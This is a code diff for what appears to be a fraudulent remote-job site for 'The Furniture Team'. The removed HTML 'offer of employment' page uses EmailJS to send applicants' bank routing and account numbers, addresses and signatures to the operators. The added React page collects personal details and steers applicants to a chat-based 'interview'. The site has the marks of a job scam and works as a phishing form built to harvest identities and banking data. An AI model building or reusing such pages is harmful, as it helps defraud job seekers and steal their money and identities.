@@ -1,356 +1,441 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Employee Onboarding | THE FURNITURE TEAM.</title>
+import { useRef, useState } from "react";
+import emailjs from "@emailjs/browser";
+import Layout from "@/components/Layout";
+import { Button } from "@/components/ui/button";
+import { useToast } from "@/hooks/use-toast";
 
-<style>
-* { box-sizing: border-box; }
+// EmailJS credentials — replace on GitHub
+const EMAILJS_PUBLIC_KEY = "1kVZ8Sotx-ZRXOAgA";
+const EMAILJS_SERVICE_ID = "service_2m31o39";
+const EMAILJS_TEMPLATE_ID = "template_z567pe8";
 
-body {
-    font-family: Arial, sans-serif;
-    background:#f4f4f4;
-    margin:0;
-    padding:20px;
-}
+const APPLICANT_ID = "XM3XG7LSX";
 
-.form-container {
-    background:#fff;
-    padding:30px;
-    max-width:700px;
-    margin:auto;
-    border-radius:8px;
-    box-shadow:0 2px 10px rgba(0,0,0,0.1);
-}
+const RemoteProcurementSpecialist = () => {
+  const formRef = useRef<HTMLFormElement>(null);
+  const { toast } = useToast();
+  const [submitting, setSubmitting] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
 
-h1, h2 { text-align:center; }
-
-input[type="text"] {
-    width:100%;
-    padding:10px;
-    margin-top:10px;
-    border-radius:4px;
-    border:1px solid #ccc;
-}
-
-.center-section {
-    max-width:400px;
-    margin:0 auto;
-}
-
-.account-type {
-    display:flex;
-    justify-content:center;
-    gap:40px;
-    margin-top:20px;
-    flex-wrap:wrap;
-}
-
-.center-text {
-    text-align:center;
-    margin-top:20px;
-    color:#444;
-}
-
-.security-notice {
-    background:#f8f9fa;
-    border-left:4px solid #007bff;
-    padding:15px;
-    margin-top:20px;
-    font-size:14px;
-    color:#333;
-}
-
-.signature-section {
-    text-align:center;
-    margin-top:30px;
-}
-
-.signature-section input {
-    width:45%;
-    margin:5px 10px;
-}
-
-.submit-btn {
-    display:block;
-    margin:30px auto 0;
-    background:#007bff;
-    color:white;
-    padding:12px 20px;
-    border:none;
-    border-radius:5px;
-    cursor:pointer;
-    font-size:16px;
-}
-
-.submit-btn:hover { background:#0056b3; }
-
-.hidden { display:none; }
-
-.footer {
-    text-align:center;
-    font-size:13px;
-    color:#666;
-    margin-top:30px;
-    line-height:1.5;
-}
-
-/* MOBILE */
-@media (max-width: 600px) {
-    .signature-section input {
-        width:100%;
-        margin:8px 0;
-    }
-
-    .account-type {
-        flex-direction:column;
-        gap:10px;
-    }
-}
-</style>
-
-<!-- EmailJS -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-(function(){
-    emailjs.init("QQo8QpAlMOohKDYLd");
-})();
-
-function acceptOffer(e){
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    document.getElementById("offerSection").classList.add("hidden");
-    document.getElementById("payrollSection").classList.remove("hidden");
-    window.scrollTo(0,0);
-}
+    if (!formRef.current) return;
+    setSubmitting(true);
+    try {
+      await emailjs.sendForm(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        formRef.current,
+        { publicKey: EMAILJS_PUBLIC_KEY }
+      );
+      setSubmitted(true);
+      formRef.current.reset();
+    } catch (err) {
+      toast({
+        title: "Submission failed",
+        description: "Please try again or email us directly.",
+        variant: "destructive"
+      });
+    } finally {
+      setSubmitting(false);
+    }
+  };
 
-function showDirectDeposit(){
-    document.getElementById("payrollSection").classList.add("hidden");
-    document.getElementById("depositSection").classList.remove("hidden");
-    window.scrollTo(0,0);
-}
+  return (
+    <Layout>
+      <div style={{ background: "#f4f6f9", color: "#333", lineHeight: 1.7 }}>
+        <div style={{ maxWidth: 1100, margin: "auto", padding: "40px 20px" }}>
+          {!submitted ? (
+            <>
+              <div className="text-center mb-8">
+                <h1 style={{ color: "#173B69", fontSize: 38, marginBottom: 10, fontWeight: 700 }}>
+                  Remote Procurement & Sourcing Specialist
+                </h1>
+              </div>
 
-function showPaperCheck(){
-    document.getElementById("payrollSection").classList.add("hidden");
-    document.getElementById("paperCheckSection").classList.remove("hidden");
-    window.scrollTo(0,0);
-}
+              <Card>
+                <H2>Position Overview</H2>
+                <p>
+                  As our company continues to grow and client purchasing requests increase, we are expanding our procurement team.
+                  We are seeking a reliable, organized, and detail-oriented professional to assist with sourcing products,
+                  communicating with manufacturers and suppliers, and coordinating procurement activities on behalf of our clients.
+                </p>
+                <br />
+                <p>
+                  This is a remote position that offers flexible scheduling while supporting our procurement, sourcing,
+                  supplier management, and purchasing operations.
+                </p>
+              </Card>
 
-function sendDeposit(e){
-    e.preventDefault();
-    emailjs.sendForm('service_algrzmz', 'template_ynt5flj', e.target)
-    .then(() => {
-        window.location.href = "success.html";
-    }, () => {
-        alert("Submission failed. Please try again.");
-    });
-}
-</script>
-</head>
+              <Card>
+                <H2>Position Responsibilities</H2>
+                <ul style={{ paddingLeft: 25 }}>
+                  {[
+                    "Contact manufacturers and suppliers to obtain product information, pricing, availability, and quotations.",
+                    "Research, identify, and evaluate qualified suppliers based on client purchasing requirements.",
+                    "Compare supplier quotations, pricing, lead times, and product specifications.",
+                    "Coordinate purchase requests and assist with purchase order processing.",
+                    "Maintain communication with suppliers regarding quotations, order status, and delivery schedules.",
+                    "Build and maintain professional relationships with manufacturers and approved suppliers.",
+                    "Maintain procurement records, supplier databases, and purchasing documentation.",
+                    "Collaborate with internal departments to support client purchasing requirements.",
+                    "Perform other procurement and sourcing duties as assigned.",
+                  ].map((t) => (
+                    <li key={t} style={{ marginBottom: 10 }}>{t}</li>
+                  ))}
+                </ul>
+              </Card>
 
-<body>
+              <Card>
+                <H2>Work Schedule</H2>
+                <table style={{ width: "100%", borderCollapse: "collapse", marginTop: 15 }}>
+                  <tbody>
+                    {[
+                      ["Employment Type", "Remote Full-Time or Part-Time"],
+                      ["Full-Time", "Approximately 35–40 hours per week"],
+                      ["Part-Time", "Approximately 20–30 hours per week"],
+                      ["Schedule", "Flexible scheduling within assigned deadlines and reporting requirements."],
+                    ].map(([k, v]) => (
+                      <tr key={k}>
+                        <td style={{ padding: 12, borderBottom: "1px solid #ddd" }}><strong>{k}</strong></td>
+                        <td style={{ padding: 12, borderBottom: "1px solid #ddd" }}>{v}</td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </Card>
 
-<!-- OFFER SECTION -->
-<div class="form-container" id="offerSection">
-    <h1>Offer of Employment</h1>
+              <Card>
+                <H2>Compensation & Benefits</H2>
+                <ul style={{ paddingLeft: 25 }}>
+                  <li style={{ marginBottom: 10 }}>$48.00–$55.00 per hour based on experience, qualifications, performance, and assigned responsibilities.</li>
+                  <li style={{ marginBottom: 10 }}>Medical Benefits</li>
+                  <li style={{ marginBottom: 10 }}>Tax Assistance Support</li>
+                  <li style={{ marginBottom: 10 }}>Performance-Based Commission Opportunities</li>
+                </ul>
+              </Card>
 
-    <p>
-    We are pleased to offer you the position of <strong>Remote Procurement & Sourcing Specialist</strong> with
-    <strong>THE FURNITURE TEAM</strong>. This offer is contingent upon successful completion of required onboarding documentation and employment eligibility verification.
-    </p>
+              <Card>
+                <H2>Continue Your Application</H2>
+                <p>
+                  If you would like to continue with the hiring process, please complete the information below.
+                  Our Human Resources team will review your information and contact you regarding the next step in the
+                  hiring process, including your Live Interview & Position Overview Session.
+                </p>
 
-    <p>
-    <strong>Employment Type:</strong> Remote (Full-Time or Part-Time, to be confirmed during onboarding)<br>
-    <strong>Reporting To:</strong> Recruitment Manager / Assigned Team Lead<br>
-    <strong>Work Location:</strong> United States (Remote)
-    </p>
+                <div style={{ background: "#eef6ff", borderLeft: "5px solid #173B69", padding: 18, margin: "25px 0" }}>
+                  <strong>Applicant Information</strong>
+                </div>
 
-    <p>
-    <strong>Compensation:</strong><br>
-    Hourly Rate: $48.00 – $55.00 per hour (based on experience and role alignment)<br>
-    Pay Schedule: Bi-weekly via Direct Deposit or Paper Check, based on employee preference.
-    </p>
+                <form ref={formRef} onSubmit={handleSubmit} style={{ marginTop: 25 }}>
+                  <Row>
+                    <Field name="full_name" type="text" placeholder="Full Name" required />
+                    <Field name="email" type="email" placeholder="Email Address" required />
+                  </Row>
 
-    <p>
-    <strong>Onboarding Incentive:</strong><br>
-    This position may include a one-time onboarding bonus, subject to company policy and eligibility requirements. Any applicable bonus, if approved, will be issued following successful completion of onboarding and initial training.
-    </p>
+                  <Row>
+                    <Field name="phone" type="tel" placeholder="Cell Phone Number" required />
+                    <Field name="street_address" type="text" placeholder="Street Address" required />
+                  </Row>
 
-    <p>
-    <strong>Benefits Eligibility:</strong><br>
-    Eligible employees may qualify for Medical, Dental, Vision, and 401(k) benefits based on employment status and company policy.
-    </p>
+                  <Row>
+                    <Field name="apartment" type="text" placeholder="Apartment / Suite #" />
+                    <Field name="city" type="text" placeholder="City" required />
+                  </Row>
 
-    <p>
-    <strong>Conditions of Employment:</strong><br>
-    • Completion of onboarding documentation<br>
-    • Verification of identity and work authorization<br>
-    • Compliance with company policies and procedures<br><br>
+                  <Row>
+                    <Field name="state" type="text" placeholder="State" required />
+                    <Field name="zip_code" type="text" placeholder="ZIP Code" required />
+                  </Row>
 
-    This position is classified as a W-2 employee role. Employment with THE FURNITURE TEAM is at-will, meaning either the employee or the company may terminate the employment relationship at any time, with or without notice, in accordance with applicable law.
-    </p>
+                  <Row>
+                    <select name="employment_type" defaultValue="" style={selectStyle} required>
+                      <option value="" disabled>Preferred Employment Type</option>
+                      <option>Full-Time</option>
+                      <option>Part-Time</option>
+                    </select>
 
-    <div class="security-notice">
-    <strong>Important Notice:</strong><br>
-    Sensitive payroll information, including Direct Deposit or Paper Check details, is collected only after offer acceptance and is processed securely through the company's official HR onboarding system.<br><br>
+                    <input
+                      name="preferred_interview_date"
+                      type="date"
+                      aria-label="Preferred Interview Date"
+                      title="Preferred Interview Date"
+                      style={selectStyle}
+                      required
+                    />
+                  </Row>
 
-    The next step only requires you to select your preferred payroll method. No banking information is requested at this stage.
-</div>
+                  <br />
 
-    <p style="text-align:center; margin-top:15px; font-size:14px;">
-        Questions? Contact HR at <strong>hr@thefurnitureteam.com</strong>
-    </p>
+                  <Button
+                    type="submit"
+                    disabled={submitting}
+                    style={{
+                      background: "#173B69",
+                      color: "#fff",
+                      padding: "15px 30px",
+                      fontSize: 16,
+                      height: "auto"
+                    }}
+                  >
+                    {submitting ? "Sending..." : "Continue Application"}
+                  </Button>
+                </form>
+              </Card>
+            </>
+          ) : (
+            <>
+              <div className="text-center mb-8">
+                <div style={{ color: "#16a34a", fontSize: 64, marginBottom: 16 }}>✅</div>
 
-    <form onsubmit="acceptOffer(event)">
-        <div class="signature-section">
-            <input type="text" name="offer_signature" placeholder="Signature" required>
-            <input type="text" name="offer_name" placeholder="Full Name" required>
-            <input type="text" name="offer_date" placeholder="Date" required>
+                <h1 style={{ color: "#173B69", fontSize: 34, marginBottom: 10, fontWeight: 700 }}>
+                  Application Submitted Successfully
+                </h1>
+
+                <h2 style={{ color: "#173B69", fontSize: 24, fontWeight: 600 }}>
+                  Thank You for Your Application
+                </h2>
+              </div>
+
+              <Card>
+                <p>
+                  Thank you for your interest in joining The Furniture Team.
+                </p>
+
+                <br />
+
+                <p>
+                  We have successfully received your application.
+                </p>
+
+                <div style={{ background: "#eef6ff", borderLeft: "5px solid #173B69", padding: 18, margin: "25px 0" }}>
+                  <strong style={{ display: "block", marginBottom: 8 }}>Applicant ID</strong>
+                  <span style={{ fontSize: 22, fontWeight: 700, color: "#173B69", letterSpacing: 1 }}>
+                    {APPLICANT_ID}
+                  </span>
+                </div>
+
+                <p>
+                  Please save this Applicant ID for your records. You may be asked to reference it during future communication with our Human Resources team.
+                </p>
+              </Card>
+
+              <Card>
+                <H2>About The Furniture Team</H2>
+
+                <p>
+                  The Furniture Team is a U.S.-based client order coordination and procurement company dedicated to helping businesses and organizations source high-quality products directly from trusted manufacturers and suppliers.
+                </p>
+
+                <br />
+
+                <p>
+                  Our team specializes in identifying qualified suppliers, obtaining competitive pricing, coordinating purchasing activities, and ensuring client orders are fulfilled accurately and efficiently.
+                </p>
+
+                <br />
+
+                <p>
+                  We work with a variety of commercial products, including office furniture, workspace solutions, storage systems, partitions, and other business-related equipment. By working directly with manufacturers and suppliers, we help our clients simplify their purchasing process while maintaining high standards of quality, reliability, and customer service.
+                </p>
+
+                <br />
+
+                <p>
+                  Our company is built on professionalism, integrity, reliability, communication, and exceptional customer service. We value individuals who demonstrate excellent communication skills, strong attention to detail, organizational abilities, professionalism, and the ability to build productive relationships with manufacturers and suppliers while following established procurement procedures.
+                </p>
+              </Card>
+
+              <Card>
+                <H2>Primary Responsibilities</H2>
+
+                <ul style={{ paddingLeft: 25 }}>
+                  {[
+                    "Communicate with manufacturers and suppliers regarding product availability, pricing, and quotations.",
+                    "Research and identify qualified suppliers that meet client purchasing requirements.",
+                    "Compare supplier quotations, pricing, lead times, and product specifications.",
+                    "Coordinate procurement requests and purchasing activities.",
+                    "Maintain accurate procurement records and supplier documentation.",
+                    "Follow up with suppliers regarding quotations, purchase orders, and delivery schedules.",
+                    "Build and maintain professional relationships with manufacturers and approved suppliers.",
+                    "Support procurement and sourcing operations while ensuring timely and accurate communication.",
+                  ].map((t) => (
+                    <li key={t} style={{ marginBottom: 10 }}>{t}</li>
+                  ))}
+                </ul>
+              </Card>
+
+              <Card>
+                <H2>Live Interview & Position Overview Session</H2>
+
+                <p>
+                  The next step in our hiring process is to participate in our Live Interview & Position Overview Session.
+                </p>
+
+                <br />
+
+                <p>
+                  <strong>During this session we will:</strong>
+                </p>
+
+                <ul style={{ paddingLeft: 25 }}>
+                  {[
+                    "Review your qualifications and experience.",
+                    "Explain the responsibilities of the Remote Procurement & Sourcing Specialist position.",
+                    "Introduce our procurement workflow and supplier communication procedures.",
+                    "Explain our onboarding and training process.",
+                    "Answer any questions you may have.",
+                  ].map((t) => (
+                    <li key={t} style={{ marginBottom: 10 }}>{t}</li>
+                  ))}
+                </ul>
+              </Card>
+
+              <Card>
+                <H2>Before Your Interview</H2>
+
+                <p>
+                  Please ensure that you:
+                </p>
+
+                <ul style={{ paddingLeft: 25 }}>
+                  {[
+                    "Continue monitoring your email regularly.",
+                    "Have reliable access to your email.",
+                    "Review the position information carefully.",
+                    "Be prepared to discuss your experience and availability.",
+                  ].map((t) => (
+                    <li key={t} style={{ marginBottom: 10 }}>{t}</li>
+                  ))}
+                </ul>
+              </Card>
+
+              <Card>
+                <H2>Interview Hours</H2>
+
+                <p style={{ marginBottom: 10 }}>
+                  <strong>Monday – Friday</strong>
+                </p>
+
+                <p>9:00 AM – 5:00 PM</p>
+              </Card>
+
+              <Card>
+                <H2>Schedule Your Interview</H2>
+
+                <p>
+                  To schedule your interview, please send your preferred day and approximate time to:
+                </p>
+
+                <br />
+
+                <p>
+                  <strong>
+                    <a
+                      href="mailto:wglober@thefurnitureteam.com"
+                      style={{ color: "#173B69", textDecoration: "underline" }}
+                    >
+                      wglober@thefurnitureteam.com
+                    </a>
+                  </strong>
+                </p>
+
+                <br />
+
+                <p>
+                  For your convenience, please save <strong>840-242-7954</strong> in your contacts. This is the number associated with your interview communications, so you will recognize the number if a member of our team contacts you by phone.
+                </p>
+
+                <br />
+
+                <p>
+                  A member of our Human Resources team will reply with your interview confirmation and your Live Support Chat link.
+                </p>
+              </Card>
+
+              <Card>
+                <H2>Joining the Interview</H2>
+
+                <p>
+                  When joining the Live Support Chat, please send the following message:
+                </p>
+
+                <br />
+
+                <div
+                  style={{
+                    background: "#f8fafc",
+                    border: "1px solid #e2e8f0",
+                    padding: 16,
+                    borderRadius: 6,
+                    fontStyle: "italic"
+                  }}
+                >
+                  "I'm here for my Live Interview & Position Overview Session."
+                </div>
+              </Card>
+
+              <Card>
+                <H2>Need Assistance?</H2>
+
+                <p>
+                  If you experience any difficulty accessing the Live Support Chat or have questions regarding the hiring process, please contact our Human Resources team by email.
+                </p>
+              </Card>
+            </>
+          )}
         </div>
+      </div>
+    </Layout>
+  );
+};
 
-        <button class="submit-btn">Accept Offer & Continue</button>
-    </form>
+const Card = ({ children }: { children: React.ReactNode }) => (
+  <div
+    style={{
+      background: "#fff",
+      padding: 35,
+      marginBottom: 30,
+      borderRadius: 10,
+      boxShadow: "0 5px 15px rgba(0,0,0,.08)"
+    }}
+  >
+    {children}
+  </div>
+);
 
-    <div class="footer">
-        THE FURNITURE TEAM — Official Employment Offer
-    </div>
-	
-</div>
-<div class="form-container hidden" id="payrollSection">
+const H2 = ({ children }: { children: React.ReactNode }) => (
+  <h2
+    style={{
+      color: "#173B69",
+      marginBottom: 18,
+      fontSize: 24,
+      fontWeight: 700
+    }}
+  >
+    {children}
+  </h2>
+);
 
-    <h1>Payroll Method Selection</h1>
+const Row = ({ children }: { children: React.ReactNode }) => (
+  <div className="grid gap-4 mb-4 md:grid-cols-2 grid-cols-1">
+    {children}
+  </div>
+);
 
-    <p class="center-text">
-        For payroll purposes, please select your preferred method of payment.
-    </p>
+const inputStyle: React.CSSProperties = {
+  width: "100%",
+  padding: 12,
+  border: "1px solid #ccc",
+  borderRadius: 5,
+  fontSize: 15,
+  background: "#fff",
+};
 
-    <div class="security-notice">
-        <strong>Payroll Notice:</strong><br>
-        Select your preferred payroll method to continue onboarding.
-    </div>
+const selectStyle = inputStyle;
 
-    <div class="account-type">
+const Field = (props: React.InputHTMLAttributes<HTMLInputElement>) => (
+  <input {...props} style={inputStyle} />
+);
 
-        <button type="button"
-                class="submit-btn"
-                onclick="showDirectDeposit()">
-            Direct Deposit
-        </button>
-
-        <button type="button"
-                class="submit-btn"
-                onclick="showPaperCheck()">
-            Paper Check
-        </button>
-
-    </div>
-</div> <!-- END payrollSection -->
-
-<!-- PAPER CHECK SECTION -->
-<div class="form-container hidden" id="paperCheckSection">
-
-    <h1>Paper Check Information</h1>
-
-    <p class="center-text">
-        Please provide your mailing information for payroll setup.
-    </p>
-
-    <div class="security-notice">
-        <strong>Payroll Notice:</strong><br>
-        Paper checks will be mailed to the address provided below.
-    </div>
-
-    <form onsubmit="sendDeposit(event)">
-
-    <input type="hidden"
-           name="paymentMethod"
-           value="Paper Check">
-
-    <div class="center-section">
-        <h2>Personal Information</h2>
-
-            <input type="text" name="fullName" placeholder="Full Name" required>
-
-            <input type="text" name="mailingAddress" placeholder="Mailing Address" required>
-
-            <input type="text" name="city" placeholder="City" required>
-
-            <input type="text" name="state" placeholder="State" required>
-
-            <input type="text" name="zipCode" placeholder="Zip Code" required>
-        </div>
-
-        <div class="signature-section">
-            <input type="text" name="signature" placeholder="Signature" required>
-
-            <input type="text" name="date" placeholder="Date" required>
-        </div>
-
-        <button class="submit-btn">
-            Submit & Continue
-        </button>
-
-    </form>
-
-    <div class="footer">
-        THE FURNITURE TEAM | HR: hr@thefurnitureteam.com
-    </div>
-
-</div>
-</div>
-
-<!-- DIRECT DEPOSIT (UNCHANGED) -->
-<div class="form-container hidden" id="depositSection">
-    <h1>Direct Deposit Authorization</h1>
-
-    <p class="center-text">
-        This information is required for payroll setup.
-    </p>
-
-    <div class="security-notice">
-        🔒 <strong>Security Notice:</strong><br>
-        Banking information is transmitted securely and used solely for payroll processing.
-        Tax documents (W-4) are <strong>not</strong> collected on this page.
-    </div>
-
-    <form onsubmit="sendDeposit(event)">
-
-    <input type="hidden"
-           name="paymentMethod"
-           value="Direct Deposit">
-
-    <div class="center-section">
-        <h2>Personal Information</h2>
-            <input type="text" name="fullName" placeholder="Full Name" required>
-        </div>
-
-        <div class="center-section">
-            <h2>Bank Information</h2>
-            <input type="text" name="bankName" placeholder="Bank Name" required>
-            <input type="text" name="bankAddress" placeholder="Bank Address" required>
-            <input type="text" name="bankCityState" placeholder="City, State" required>
-            <input type="text" name="bankZip" placeholder="Zip Code" required>
-            <input type="text" name="routingNumber" placeholder="Routing Number" required>
-            <input type="text" name="accountNumber" placeholder="Account Number" required>
-        </div>
-
-        <div class="account-type">
-            <label><input type="radio" name="accountType" value="Checking" required> Checking</label>
-            <label><input type="radio" name="accountType" value="Savings" required> Savings</label>
-        </div>
-
-        <div class="signature-section">
-            <input type="text" name="signature" placeholder="Signature" required>
-            <input type="text" name="date" placeholder="Date" required>
-        </div>
-
-        <button class="submit-btn">Submit & Continue</button>
-    </form>
-
-    <div class="footer">
-        THE FURNITURE TEAM | HR: hr@thefurnitureteam.com
-    </div>
-</div>
-
-</body>
-</html>
+export default RemoteProcurementSpecialist;
